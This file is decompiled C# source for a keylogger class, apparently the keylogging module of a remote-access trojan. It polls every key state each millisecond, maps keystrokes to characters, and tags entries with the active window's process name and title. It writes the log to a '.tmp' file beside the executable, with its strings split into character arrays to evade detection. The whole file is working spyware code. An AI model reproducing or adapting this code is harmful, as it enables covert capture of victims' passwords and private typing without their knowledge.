using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace w;

public class kl
{
	private int LastAV;

	private string LastAS;

	private Keys lastKey;

	public Clock Clock;

	public string Logs;

	private object keyboard;

	public string LogsPath;

	public kl()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		lastKey = (Keys)0;
		Clock = new Clock();
		Logs = "";
		keyboard = (object)new Keyboard();
		LogsPath = Assembly.GetExecutingAssembly().Location + new string(new char[4] { '.', 't', 'm', 'p' });
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int dwLayout);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int lpdwProcessID = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			object processById = Process.GetProcessById(lpdwProcessID);
			if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == LastAV), Operators.CompareObjectEqual((object)LastAS, NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
				return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("\r\n\u0001" + HM(), " "), NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" "), (object)LastAS), (object)'\u0001'), (object)"\r\n"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string HM()
	{
		try
		{
			return Clock.get_LocalTime().ToString(new string(new char[8] { 'y', 'y', '/', 'M', 'M', '/', 'd', 'd' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[8] { '?', '?', '/', '?', '?', '/', '?', '?' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string VKCodeToUnicode(uint VKCode)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[255];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(VKCode, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int lpdwProcessID = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			IntPtr dwhkl = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)VKCode)).ToString();
	}

	private string Fix(Keys k)
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Invalid comparison between Unknown and I4
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Invalid comparison between Unknown and I4
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Invalid comparison between Unknown and I4
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Invalid comparison between Unknown and I4
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Invalid comparison between Unknown and I4
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Invalid comparison between Unknown and I4
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Invalid comparison between Unknown and I4
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Invalid comparison between Unknown and I4
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Invalid comparison between Unknown and I4
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Invalid comparison between Unknown and I4
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Invalid comparison between Unknown and I4
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Invalid comparison between Unknown and I4
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Invalid comparison between Unknown and I4
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Invalid comparison between Unknown and I4
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Invalid comparison between Unknown and I4
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Invalid comparison between Unknown and I4
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0142: Invalid comparison between Unknown and I4
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Invalid comparison between Unknown and I4
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Invalid comparison between Unknown and I4
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Invalid comparison between Unknown and I4
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Invalid comparison between Unknown and I4
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Invalid comparison between Unknown and I4
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Invalid comparison between Unknown and I4
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Invalid comparison between Unknown and I4
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Invalid comparison between Unknown and I4
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Invalid comparison between Unknown and I4
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		//IL_0359: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0387: Expected I4, but got Unknown
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Expected I4, but got Unknown
		bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(keyboard, (Type)null, "ShiftKeyDown", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(keyboard, (Type)null, "CapsLock", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)k != 112 && (int)k != 113 && (int)k != 114 && (int)k != 115 && (int)k != 116 && (int)k != 117 && (int)k != 118 && (int)k != 119 && (int)k != 120 && (int)k != 121 && (int)k != 122 && (int)k != 123 && (int)k != 35 && (int)k != 46 && (int)k != 8)
			{
				if ((int)k != 160 && (int)k != 161 && (int)k != 65536 && (int)k != 16 && (int)k != 131072 && (int)k != 17 && (int)k != 163 && (int)k != 162 && (int)k != 262144)
				{
					if ((int)k == 32)
					{
						return new string(new char[1] { ' ' });
					}
					if ((int)k != 13 && (int)k != 13)
					{
						if ((int)k == 9)
						{
							return new string(new char[5] { '[', 'T', 'A', 'P', ']' }) + "\r\n";
						}
						checked
						{
							if (flag)
							{
								return VKCodeToUnicode((uint)k).ToUpper();
							}
							return VKCodeToUnicode((uint)k);
						}
					}
					if (Logs.EndsWith(new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n"))
					{
						return "";
					}
					return new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n";
				}
				return "";
			}
			return "[" + ((Enum)k).ToString() + "]";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void WRK()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Logs = File.ReadAllText(LogsPath);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (Logs.Length > 20480)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						File.WriteAllText(LogsPath, Logs);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
